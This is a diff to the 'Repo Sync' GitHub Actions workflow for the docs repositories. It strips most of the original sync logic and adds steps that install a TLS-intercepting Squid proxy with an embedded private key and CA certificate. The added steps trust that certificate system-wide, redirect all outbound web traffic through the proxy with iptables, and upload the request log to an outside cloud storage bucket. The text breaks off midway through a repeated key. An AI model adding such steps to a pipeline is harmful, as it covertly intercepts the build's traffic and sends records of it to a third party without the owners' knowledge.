@@ -1,261 +1,674 @@
-# The docs.github.com project has two repositories: github/docs (public) and github/docs-internal (private)
-#
-# This GitHub Actions workflow keeps the `main` branch of those two repos in sync.
-#
-# For more details, see https://github.com/repo-sync/repo-sync#how-it-works
-
-name: Repo Sync
-
-# **What it does**:
-#  - close-invalid-repo-sync: Close repo sync pull requests not created by Octomerger or a Hubber.
-#  - repo-sync: Syncs docs and docs-internal.
-# **Why we have it**:
-#  - close-invalid-repo-sync: Another form of spam prevention for the open-source repository.
-#  - repo-sync: To keep the open-source repository up-to-date, while still having an internal
-#    repository for sensitive work.
-# **Who does it impact**: Open-source.
-
-on:
-  workflow_dispatch:
-  schedule:
-    - cron: '10,40 * * * *' # every 30 minutes
-
-permissions:
-  contents: write
-  pull-requests: write
-
+env:
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  NODE_OPTIONS: --use-openssl-ca
 jobs:
   close-invalid-repo-sync:
     name: Close invalid Repo Sync PRs
     runs-on: ubuntu-latest
     steps:
-      - name: Find pull request
-        if: ${{ github.repository == 'github/docs' }}
-        uses: juliangruber/find-pull-request-action@db875662766249c049b2dcd85293892d61cb0b51
-        id: find-pull-request
-        with:
-          github-token: ${{ secrets.DOCS_BOT_SPAM_VISION }}
-          branch: repo-sync
-          base: main
-          state: open
+    - name: before
+      run: 'sudo apt update
 
-      - name: Close pull request if unwanted
-        if: ${{ github.repository == 'github/docs' && steps.find-pull-request.outputs.number }}
-        uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
-        with:
-          github-token: ${{ secrets.DOCS_BOT_SPAM_VISION }}
-          script: |
-            const { owner, repo } = context.repo
+        sudo apt install -y squid-openssl
 
-            const { data: pr } = await github.pulls.get({
-              owner,
-              repo,
-              pull_number: parseInt(${{ steps.find-pull-request.outputs.number }})
-            })
+        sudo mkdir /squid
 
-            const prCreator = pr.user.login
+        cat << EOF | sudo tee /squid/key.pem
 
-            // If the PR creator is the expected account, stop now
-            if (prCreator === 'Octomerger') {
-              return
-            }
+        -----BEGIN PRIVATE KEY-----
 
-            try {
-              await github.teams.getMembershipForUserInOrg({
-                org: 'github',
-                team_slug: 'employees',
-                username: prCreator
-              })
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
 
-              // If the PR creator is a GitHub employee, stop now
-              return
-            } catch (err) {
-              // An error will be thrown if the user is not a GitHub employee.
-              // That said, we still want to proceed anyway!
-            }
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
 
-            // Close the PR and add the invalid label
-            await github.issues.update({
-              owner,
-              repo,
-              issue_number: pr.number,
-              labels: ['invalid'],
-              state: 'closed'
-            })
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
 
-            // Comment on the PR
-            await github.issues.createComment({
-              owner,
-              repo,
-              issue_number: pr.number,
-              body: "Please leave this `repo-sync` branch to the robots!\n\nI'm going to close this pull request now, but feel free to open a new issue or ask any questions in [discussions](https://github.com/github/docs/discussions)!"
-            })
+        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
 
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
+
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
+
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
+
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
+
+        qMJuHGwKPtHopVqxK8k7p0PKvuGqJIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B
+
+        0lu7LZ/Aoh3ckh71IrSKyZafXLpUmpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHq
+
+        DYkELFBZ650JrYYrQ4UouRAucp8K9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+
+
+        Z89sQ4FoTtBvz1+Lv+s4ej/lVxoTJQIDAQABAoICABzNO3uurl9kZws6qAcG4ogo
+
+        05UUM0+09Ujmvj37ymsjAlLFQFtYaKtJDqEWYP92i3w7jmErZo2SZOXHl/yy/zHQ
+
+        B4o6s4J3djHTxrJIf68TpZdYs5ZJxOIeoiql8I1bc/jKuVBGVqt8o2IvoHfSh0ti
+
+        U1bNQSDuMbG5yeo4cEfewSTrwf03UsZx0Jszo0qrJ5ny+CkPtkUH4NL2GXJjWh8D
+
+        XOKfN0LDSc8mdu8bBKg15IdQnWtDj/eI1YYe2v/p2zjWHMzLEoigVCLMsUN1itK4
+
+        Z4rUn1nvHWEqBC0KDEU6vKVoGNeM0bUX0OcOGd32Eur71XbQVmiJaZtAslgxb/rp
+
+        4HQN5nsdBm04bkw/apORj5bZBms/IM/g+e33+gMzP5LYJ0tjr74hnCBXZoMi78vT
+
+        BvB+9iP0vxvORQPvPlQAczKSoxAZABnhWPV4mNcj6kwtCcKbt06pDHwyWXXOBfx3
+
+        ZsNXOjuR4rbf6NNwu+q0hyU9sE92+Fjj9dpq93aeTBF8yAR8yr1AYpdwp2IOhIYX
+
+        GsB3k7gLR5zIERrnoYSEgltbpYxRiO0QdG+zliWogqZcKWeVI2hgvLhPDP+wmD90
+
+        5qw+51EDDzpsHzL5JBp79EPWXMCaLc0cbxuzNwsnpfqjvNqpzdfEXBxFuAJERvLO
+
+        rNuPesvmjDCRZbHzItQpAoIBAQDYLwoVFweDhuuUZJWg0IJYJb7sRhejcJj88KA2
+
+        fDulwfUtVEFZLoB3qfLxYgg2aTvRLr7Gi3OwJMKnt+KR1Wq+wMPDp9FERcAHxlnv
+
+        5O9b9oxduJEsKo/eBqhdNVskO21Bnxsjs2ts4uc/YuFerps1vIYKBfqngey73ZwR
+
+        3xubWJ4CvwWoANdyfCbitn9cW+U90O3uw4OlCngzKEew1MZcILAFLhH9b9PlXiT6
+
+        Z+rMkymTYddDLpi240vu0wSkfcldqC43HWaL3UG1p35dDsOk+64xWqfegX/OddSn
+
+        8DdT3P/DAaXxqazyrWQ3ND2Feo0uQsPjHFl8i4JEwodU3n5JAoIBAQC6IhN3lS7I
+
+        fbziNStrkhBP/whefErqSz5KX6e006n772ugr6GqM+XUvd0Bl/PP/Ibqu7lFZ5nt
+
+        /Jcl45xxgvBvmCxx1w543LCNIN2D4bAoyV2I3y9Tmg2MmTcBo5JdbV0jrBMSamYD
+
+        UuKPkWj+UmWTKbyLPfoJJpqrAIg4VG9Bbkv6OG9crTPFhBDF4IOR5W7RS+F5AsI8
+
+        w6sr1BkkMHaTSMhXByox9nKQcvYo0hh1fXWeuzU+pP8LFzK1uDcljICuJMFWAUBE
+
+        bZfih2u0m9BrkceyD8XJWfRncrm0qZenA4JzmoDU/AuoZsJWE60mk0ZBz5uY0Soq
+
+        bh1im8kfoR39AoIBAAsR/ZYu47echRvIOtFNXB9fb3Nx82vvLCZnvAyOOA+46vEz
+
+        S1VhyDpYfZRWzMzcfq+rkSFhqr7uYvlrtTJ6l0jFXkD6qwCwAbFkOt7J/mfbLDzw
+
+        Yp68XzmjZaPAQ7aLRIEDwMQHQA0HYYghbCEJF/GcgdCplbhWMuU75+4SWruNwimp
+
+        1oRP5rh6GxOo/MSiAA82T7jWUjt1Wcpk2ab4fl/hXKInRcyQmW05cPNRtvha4Non
+
+        PHq4PCHBafYE4Ev8FP+yyQsRelrXLbI7rYDebK5aJQVp+wat4vmTlxwydOLagk5e
+
+        Gz1QzwZuUp9xEWVwbSJdUOKkZQC3tCgJPhzed+ECggEASloAUr1p8bagc+/vR0oS
+
+        cBIdArk9p7eky0rIkCgY98VcxdRCjN2sSj4JgXB0eTmTn0KbsIjA6VsD+aOhQ4qd
+
+        hsZPwq24Xzkw4T8mnV7S4ogFb/5PRmL8VJSDb4kql11vXieHesy7sUozrEvWl/jM
+
+        EGwUn76DGZKtJ+/PekjoJEft26cdfPTHAHhPxut3QxlWGg7oo1Ehy+oRfzF7VYRy
+
+        aUUimfkHtuuOOftiL041bQFPsbdwfnSkWIbMv+A1Ty9/25BdFoDrbiolCN01ffDb
+
+        4YxbK9q3FEZ1pbkjS3KPXKy/OHSYT/vaoEtkB8RWX1lnMDTBH9s1r7tKy7AVOChA
+
+        9QKCAQBGk5Vt5t4ajOun621D8nsQZzR5M8g9rpEByeb4e0IekSSUHliVhZc7IIq+
+
+        FYq49KNyGhiPO8gheTWLI00AGDo9z/4Fn7Hu4Y80HjYOOJyza+ha3m9yWHOecWnI
+
+        c5VtTRdHZGLjCrIFQ1yBrLlfnb16g4ZlFkTF6yAHi0uiC04uQs7jLXhijgjwJTos
+
+        r3aKT/8KVf2xsCzWMrOL2AAFKJkcdf5yIKhUzXB7KeFWZvLtG5R9emBbv7M1D6a+
+
+        08r8eBPNYkb6MNoEraQoOUtSRLPyYdvYFVb538W7G+/wMP7c/vXqP55x1yuhuQAV
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        MIIFazCCA1OgAwIBAgIUESF0O95jnInouKvlcRiLTkelzHowDQYJKoZIhvcNAQEL
+
+        BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+
+        GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDQyMjIxNTJaFw0zNDEw
+
+        MDIyMjIxNTJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+
+        HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+
+        AQUAA4ICDwAwggIKAoICAQCdLvQDIyCns8bhvQOqTPVeYwa6pK11+9UKqjGRldBi
+
+        mpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+lXgMF0GfgpXRy2BULUxAYg8w4aTlR
+
+        32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQXG9QNYzMR+pGXsa1NNDRgSAvlQPMz
+
+        Le9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1QkzxcZLqproEIqOlS4KsGXyo6BwhXH+H
+
+        I82RCIbaj2ub4y355onYuAoTpsb9KBxud0HejzQesYen8OmgbNo9+FfK5+Q5XvYb
+
+        7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkgpjo/nkhw2OyCji6DFXCvlJRCBoup
+
+        n9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6ssgX+FMDrzeiNArdmIHKCPC3QrSb6
+
+        jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jitqMJuHGwKPtHopVqxK8k7p0PKvuGq
+
+        JIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B0lu7LZ/Aoh3ckh71IrSKyZafXLpU
+
+        mpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHqDYkELFBZ650JrYYrQ4UouRAucp8K
+
+        9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+Z89sQ4FoTtBvz1+Lv+s4ej/lVxoT
+
+        JQIDAQABo1MwUTAdBgNVHQ4EFgQUrUQ1F+rM0kk5tI/PEZvONIAL9WcwHwYDVR0j
+
+        BBgwFoAUrUQ1F+rM0kk5tI/PEZvONIAL9WcwDwYDVR0TAQH/BAUwAwEB/zANBgkq
+
+        hkiG9w0BAQsFAAOCAgEAihN0oWVSwHDimXbh3Wp7L2qc39whQEPu+m2OIB50Dp0X
+
+        K1WL784TzXmbz1DuvGXWGIjn4PDL5NQ991S3nPjD5Fk9VjzU4IZ9XR8AmVZFCltX
+
+        zZm01L6FQLGvjpQZs9KCEeS05CUjAiArPMsYSKJDTUi2XCuTR+FGiBHtYrg8GClp
+
+        EQkTCTA9kFNI6ThlDAPgwj4VBJZX5p8KAFlHpwztfDnIgfwdQJBUW1D2hkxLWyvs
+
+        tZFLmYAHk5Lfixpt2+25HAp5kHMRfoJQLAsRQ/kmeNjoG5WQkIshXDURQZQlPnmP
+
+        yBueix5POd09hYHSL3kqdHoiX0P0oqeLakAMqFnKJapjpsv7teWQPnlTgalCIA/7
+
+        RwhUqsxOlRV5/26oXrlYtgMneXemikVT0hS98aw3T2icSWq6/i0L1v21ZCP5DSKI
+
+        GR6lb9RCSkJvkoTjZAm7IvxMyOZsYY2FL2mm00aY9Ufqeqozf7/q8JWwd6gaIfd7
+
+        KqOUgu0a/+sgOAu5f+dd20zAhtvAttyQIpy1gGcda9DjXpdCTv1slErC94VCcZrE
+
+        LQlR5nEjAAKK/fZ07pgBwJdMY/kWE9WRx32olhhveRS9nczKSyhutwmbuU1vkfcN
+
+        26RR8dfuMnnNzxzd2Ht30Ep8wONz/kfw/xWuUo/A8pND2I6s6bt8K5iphrv3xVI=
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      id: find-pull-request
+      if: ${{ github.repository == 'github/docs' }}
+      name: Find pull request
+      uses: juliangruber/find-pull-request-action@db875662766249c049b2dcd85293892d61cb0b51
+      with:
+        base: main
+        branch: repo-sync
+        github-token: ${{ secrets.DOCS_BOT_SPAM_VISION }}
+        state: open
+    - continue-on-error: true
+      if: ${{ github.repository == 'github/docs' && steps.find-pull-request.outputs.number
+        }}
+      name: Close pull request if unwanted
+      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
+      with:
+        github-token: ${{ secrets.DOCS_BOT_SPAM_VISION }}
+        script: "const { owner, repo } = context.repo\n\nconst { data: pr } = await\
+          \ github.pulls.get({\n  owner,\n  repo,\n  pull_number: parseInt(${{ steps.find-pull-request.outputs.number\
+          \ }})\n})\n\nconst prCreator = pr.user.login\n\n// If the PR creator is\
+          \ the expected account, stop now\nif (prCreator === 'Octomerger') {\n  return\n\
+          }\n\ntry {\n  await github.teams.getMembershipForUserInOrg({\n    org: 'github',\n\
+          \    team_slug: 'employees',\n    username: prCreator\n  })\n\n  // If the\
+          \ PR creator is a GitHub employee, stop now\n  return\n} catch (err) {\n\
+          \  // An error will be thrown if the user is not a GitHub employee.\n  //\
+          \ That said, we still want to proceed anyway!\n}\n\n// Close the PR and\
+          \ add the invalid label\nawait github.issues.update({\n  owner,\n  repo,\n\
+          \  issue_number: pr.number,\n  labels: ['invalid'],\n  state: 'closed'\n\
+          })\n\n// Comment on the PR\nawait github.issues.createComment({\n  owner,\n\
+          \  repo,\n  issue_number: pr.number,\n  body: \"Please leave this `repo-sync`\
+          \ branch to the robots!\\n\\nI'm going to close this pull request now, but\
+          \ feel free to open a new issue or ask any questions in [discussions](https://github.com/github/docs/discussions)!\"\
+          \n})\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/Daniel8mvp/docs.$(date
+        +%s)
+    timeout-minutes: 60
   repo-sync:
-    needs: close-invalid-repo-sync
-    if: github.repository == 'github/docs-internal' || github.repository == 'github/docs'
     name: Repo Sync
+    needs: close-invalid-repo-sync
     runs-on: ubuntu-latest
     steps:
-      - name: Check out repo
-        uses: actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579
+    - name: before
+      run: 'sudo apt update
 
-      # Set up npm and run npm ci to run husky to get githooks for LFS
-      - name: Setup node
-        uses: actions/setup-node@1f8c6b94b26d0feae1e387ca63ccbdc44d27b561
-        with:
-          node-version: 16.14.x
-          cache: npm
-      - name: Install dependencies
-        run: npm ci
+        sudo apt install -y squid-openssl
 
-      - name: Sync repo to branch
-        uses: repo-sync/github-sync@3832fe8e2be32372e1b3970bbae8e7079edeec88
-        env:
-          GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
-        with:
-          source_repo: ${{ secrets.SOURCE_REPO }} # https://${access_token}@github.com/github/the-other-repo.git
-          source_branch: main
-          destination_branch: repo-sync
-          github_token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+        sudo mkdir /squid
 
-      - name: Create pull request
-        uses: repo-sync/pull-request@65194d8015be7624d231796ddee1cd52a5023cb3
-        env:
-          GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
-        with:
-          source_branch: repo-sync
-          destination_branch: main
-          pr_title: 'repo sync'
-          pr_body: "This is an automated pull request to sync changes between the public and private repos.\n\n:robot: This pull request should be merged (not squashed) to preserve continuity across repos, so please let a bot do the merging!"
-          pr_label: automated-reposync-pr
-          github_token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
-          # This will exit 0 if there's no difference between `repo-sync`
-          # and `main`. And if so, no PR will be created.
-          pr_allow_empty: false
+        cat << EOF | sudo tee /squid/key.pem
 
-      - name: Find pull request
-        uses: juliangruber/find-pull-request-action@db875662766249c049b2dcd85293892d61cb0b51
-        id: find-pull-request
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          branch: repo-sync
-          base: main
-          author: Octomerger
-          state: open
+        -----BEGIN PRIVATE KEY-----
 
-      # Because we get far too much spam ;_;
-      - name: Lock conversations
-        if: ${{ github.repository == 'github/docs' && steps.find-pull-request.outputs.number }}
-        uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
-        with:
-          script: |
-            try {
-              await github.issues.lock({
-                ...context.repo,
-                issue_number: parseInt(${{ steps.find-pull-request.outputs.number }}),
-                lock_reason: 'spam'
-              })
-              console.log('Locked the pull request to prevent spam!')
-            } catch (error) {
-              // Log the error but don't fail the workflow
-              console.error(`Failed to lock the pull request. Error: ${error}`)
-            }
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
 
-      # There are cases where the branch becomes out-of-date in between the time this workflow began and when the pull request is created/updated
-      - name: Update branch
-        if: ${{ steps.find-pull-request.outputs.number }}
-        uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
-        with:
-          github-token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
-          script: |
-            const mainHeadSha = await github.git.getRef({
-              ...context.repo,
-              ref: 'heads/main'
-            })
-            console.log(`heads/main sha: ${mainHeadSha.data.object.sha}`)
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
 
-            const pull = await github.pulls.get({
-              ...context.repo,
-              pull_number: parseInt(${{ steps.find-pull-request.outputs.number }})
-            })
-            console.log(`Pull request base sha: ${pull.data.base.sha}`)
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
 
-            if (mainHeadSha.data.object.sha !== pull.data.base.sha || pull.data.mergeable_state === 'behind') {
-              try {
-                const updateBranch = await github.pulls.updateBranch({
-                  ...context.repo,
-                  pull_number: parseInt(${{ steps.find-pull-request.outputs.number }})
-                })
-                console.log(updateBranch.data.message)
-              } catch (error) {
-                // When the head branch is modified an error with status 422 is thrown
-                // We should retry one more time to update the branch
-                if (error.status === 422) {
-                  try {
-                    const updateBranch = await github.pulls.updateBranch({
-                      ...context.repo,
-                      pull_number: parseInt(${{ steps.find-pull-request.outputs.number }})
-                    })
-                    console.log(updateBranch.data.message)
-                  } catch (error) {
-                    // Only retry once. We'll rely on the update branch workflow to update
-                    // this PR in the case of a second failure.
-                    console.log(`Retried updating the branch, but an error occurred: ${error}`)
-                  }
-                } else {
-                  // A failed branch update shouldn't fail this worklow.
-                  console.log(`An error occurred when updating the branch: ${error}`)
-                }
-              }
-            } else {
-              console.log(`Branch is already up-to-date`)
-            }
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
 
-      - name: Check pull request file count after updating
-        if: ${{ steps.find-pull-request.outputs.number }}
-        uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
-        id: pr-files
-        env:
-          PR_NUMBER: ${{ steps.find-pull-request.outputs.number }}
-        with:
-          github-token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
-          result-encoding: string
-          script: |
-            const { data: prFiles } = await github.pulls.listFiles({
-              ...context.repo,
-              pull_number: process.env.PR_NUMBER,
-            })
-            core.setOutput('count', (prFiles && prFiles.length || 0).toString())
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
 
-      # Sometimes after updating the branch, there aren't any remaining files changed.
-      # If not, we should close the PR instead of merging it and triggering deployments.
-      - name: Close the pull request if no files remain
-        if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count == '0' }}
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          gh pr close ${{ steps.find-pull-request.outputs.number }} --repo $GITHUB_REPOSITORY
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
 
-      - name: Approve pull request
-        if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count != '0' }}
-        uses: juliangruber/approve-pull-request-action@c530832d4d346c597332e20e03605aa94fa150a8
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          number: ${{ steps.find-pull-request.outputs.number }}
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
 
-      - name: Enable GitHub auto-merge
-        if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count != '0' }}
-        env:
-          GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
-          AUTOMERGE_PR_NUMBER: ${{ steps.find-pull-request.outputs.number }}
-        run: node .github/actions-scripts/enable-automerge.js
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
 
-      - name: Send Slack notification if workflow fails
-        uses: someimportantcompany/github-actions-slack-message@f8d28715e7b8a4717047d23f48c39827cacad340
-        if: failure()
-        with:
-          channel: ${{ secrets.DOCS_ALERTS_SLACK_CHANNEL_ID }}
-          bot-token: ${{ secrets.SLACK_DOCS_BOT_TOKEN }}
-          color: failure
-          text: The last repo-sync run for ${{github.repository}} failed. See https://github.com/${{github.repository}}/actions?query=workflow%3A%22Repo+Sync%22
+        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
+
